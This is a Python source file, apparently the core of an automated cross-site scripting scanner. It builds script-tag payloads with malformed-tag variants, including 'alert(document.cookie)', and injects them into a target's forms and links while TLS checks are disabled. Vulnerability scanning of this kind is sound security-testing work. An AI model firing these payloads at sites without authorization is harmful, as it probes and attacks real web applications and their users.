from random import randint

from requests.packages.urllib3.exceptions import InsecureRequestWarning

from lib.helper.Log import *
from lib.helper.helper import *
from lib.scanner import Detector, Injector, Reporter

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


class core:

	@classmethod
	def generate(self, eff):
		FUNCTION = [
			"prompt(5000/200)",
			"alert(6000/3000)",
			"alert(document.cookie)",
			"prompt(document.cookie)",
			"console.log(5000/3000)",
		]
		if eff == 1:
			return r"<script/>" + FUNCTION[randint(0, 4)] + r"<\script\>"
		elif eff == 2:
			return r"<\script/>" + FUNCTION[randint(0, 4)] + r"<\script>"
		elif eff == 3:
			return r"<\script\> " + FUNCTION[randint(0, 4)] + r"<//script>"
		elif eff == 4:
			return r"<script>" + FUNCTION[randint(0, 4)] + r"<\script/>"
		elif eff == 5:
			return "<script>" + FUNCTION[randint(0, 4)] + "<//script>"
		return "<script>" + FUNCTION[randint(0, 4)] + "</script>"

	@classmethod
	def _request_with_retries(self, method, url, **kwargs):
		last_error = None
		for _ in range(self.retries + 1):
			try:
				response = self.session.request(
					method,
					url,
					verify=False,
					timeout=self.timeout,
					**kwargs,
				)
				return response, None
			except Exception as e:
				last_error = str(e)
		return None, last_error

	@classmethod
	def main(
		self,
		url,
		proxy,
		headers,
		payloads,
		cookie,
		method=2,
		timeout=15,
		retries=1,
		output_json=None,
		reporter=None,
		auto_export=True,
	):
		print(W + "*" * 15)
		self.url = url
		self.timeout = timeout
		self.retries = retries
		try:
			self.session = session(proxy, headers, cookie)
		except Exception as e:
			Log.high("Invalid request configuration: " + str(e))
			return
		self.detector = Detector()
		self.reporter = reporter if reporter is not None else Reporter()
		Log.info("Checking connection to: " + Y + url)

		ctr, error = self._request_with_retries("GET", url)
		if ctr is None and url.lower().startswith("http://"):
			fallback_url = "https://" + url[7:]
			Log.warning("HTTP failed, trying HTTPS fallback: " + C + fallback_url)
			ctr, error = self._request_with_retries("GET", fallback_url)

		if ctr is None:
			Log.high("Internal error: " + str(error))
			return

		self.url = ctr.url
		self.body = ctr.text

		if ctr.status_code > 400:
			Log.info("Connection failed " + G + str(ctr.status_code))
			return

		Log.info("Connection estabilished " + G + str(ctr.status_code))

		for payload in payloads:
			Log.info("Testing payload: " + G + payload)
			injector = Injector(
				session=self.session,
				base_url=self.url,
				html_body=self.body,
				payload=payload,
				detector=self.detector,
				reporter=self.reporter,
				timeout=self.timeout,
				retries=self.retries,
			)

			results = []
			if method >= 2:
				results.extend(injector.scan_post_forms())
				results.extend(injector.scan_get_links())
				results.extend(injector.scan_get_forms())
			elif method == 1:
				results.extend(injector.scan_post_forms())
			elif method == 0:
				results.extend(injector.scan_get_links())
				results.extend(injector.scan_get_forms())

			findings = 0
			for result in results:
				self.reporter.report(result)
				if result.detected:
					findings += 1

			Log.info(f"Payload summary: {findings} findings from {len(results)} checks")

		if output_json and auto_export:
			self.reporter.export_json(output_json)
